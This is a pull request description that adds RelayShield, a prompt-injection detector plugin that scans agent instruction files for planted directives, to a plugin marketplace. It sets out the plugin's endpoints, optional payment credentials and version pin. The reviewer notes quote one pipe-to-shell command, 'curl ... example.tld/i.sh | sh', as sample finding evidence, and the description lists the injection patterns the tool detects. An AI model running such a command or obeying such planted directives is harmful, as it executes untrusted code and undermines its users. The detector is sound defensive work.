## What this PR does

Adds one remote-source entry for the RelayShield plugin.

- Plugin name: `relayshield`
- Type: remote source
- Source URL + pinned SHA: `https://github.com/RelayShield/relayshield-plugin.git` @ `72fe82cd0d15c94a3ddecac8fbfaddcf1c4c339f`
- Homepage: https://relayshield.net

It ships one skill and one MCP server. The skill screens the instruction files a
repository gives an agent (README, `AGENTS.md`, `CLAUDE.md`, `.cursorrules`, MCP
manifests) for text that would make an agent fetch and execute remote code,
override prior instructions, or read credential files, including directives
hidden in zero-width or Unicode tag characters. Every domain those instructions
reference is then checked against an indicator corpus.

It is intended to run at the moment a developer is about to add an MCP server or
install a tool their agent found on its own, which is the point at which the
decision is actually made.

## Ownership

- [x] I own this plugin or have the right to distribute it.
- [x] The `source` repo is published under our official org (or I've explained why not below).

`RelayShield/relayshield-plugin` is our org. The org is also the source of record
for our MCP server (`RelayShield/relayshield-mcp`, published to PyPI as
`relayshield-mcp` and listed in the official MCP registry as
`io.github.nzdsf2-gif/relayshield-mcp`) and for `RelayShield/rsscan`.

## Checklist

- [x] Added/updated exactly one entry in `.grok-plugin/marketplace.json` (valid JSON, kebab-case `name`).
- [x] Remote source pins a full 40-char lowercase commit `sha`, and that commit is public + reachable.
- [x] Regenerated `.grok-plugin/plugin-index.json` (`python3 scripts/generate-plugin-index.py`).
- [x] `python3 scripts/validate-catalog.py` passes locally.
- [x] `python3 scripts/generate-plugin-index.py --check` passes locally.
- [x] `homepage` + clear `description` set; local plugins include `README.md` + `.grok-plugin/plugin.json`.
- [x] License is stated.

The plugin is MIT, stated in `.claude-plugin/plugin.json` and shipped as a
`LICENSE` file at the root of the source repo.

## Security

- [x] No `curl | bash`, remote-code download/exec, or `postinstall` RCE.
- [x] No reading/exfiltration of secrets, tokens, `.env`, or env vars.
- [x] Hooks and MCP scope are least-privilege.

**Network endpoints this plugin calls (and why):**

- `https://api.relayshield.net` is the only host the plugin calls at runtime. The
  MCP server is a thin client for that API; the checks run server-side because
  they compare against an indicator corpus that cannot ship inside a plugin.
- The MCP server itself is installed by `uvx` from PyPI as `relayshield-mcp`,
  declared in `.mcp.json`, so PyPI is reached by the package manager at install
  time in the ordinary way.

**Credentials/permissions it requires (and why):**

- **None to install, and none to discover.** The endpoint is pay-per-call over
  x402: an unauthenticated request returns a 402 carrying the payment
  requirements, so nothing is needed to see what the check costs and what it
  returns.
- **To get an actual result, one of two, both optional and both read from the
  environment if the user sets them:** `RELAYSHIELD_X_PAYMENT` (an x402 payment
  header, pay-per-call, no account) or `x-api-key` on the metered route for
  existing subscribers. The plugin never writes either, never reads a credential
  file, and neither is required for the plugin to install or load.
- **No hooks at all.** `plugin.json` declares none, so nothing runs on `Bash`,
  `Write`, or any other lifecycle event. The skill is invoked by the user or by
  the agent deciding it is relevant, and the MCP server is stdio.

## Notes for reviewers

Three things that may save you time:

**The MCP server is pinned with a floor for a safety reason, not tidiness.**
`.mcp.json` requires `relayshield-mcp>=0.2.10`. Versions at or below 0.2.9 declare
`mcp` with no upper bound, resolve `mcp` 2.x, and die at import. The floor makes
it impossible to install a version that cannot start.

**A static audit will hit a `curl | bash` string in `SKILL.md`, and I would
rather point at it than have you find it.** Line 59 of the skill contains:

```
"evidence": "curl -sL https://example.tld/i.sh | sh"
```

That is inside a sample JSON **response**, as the `evidence` field of a finding.
It is what the tool reports having FOUND in somebody else's repository, not an
instruction to anyone, and `example.tld` is a reserved documentation domain that
resolves nowhere. It is the only occurrence.

For completeness, every URL anywhere in the plugin: `api.relayshield.net` is the
only host it CALLS. `github.com/RelayShield/relayshield-plugin` is the
`repository` field, `docs.astral.sh/uv/` is a link in the README explaining that
the MCP server launches with `uvx`, and `example.tld` is the documentation domain
above. There are no others.

The same applies to your prompt-injection rejection class more broadly: this
plugin is a detector for it, so `SKILL.md` necessarily describes the patterns it
matches. If any of it reads like an instruction aimed at an installing agent, I
would rather you flag it than wave it through.

**Provenance.** The same plugin is also distributed through our own Claude Code
marketplace at `nzdsf2-gif/relayshield`, which is our monorepo and predates the
org repo. The org repo is now the canonical source and the two are kept
byte-identical by a checked sync rather than by hand.
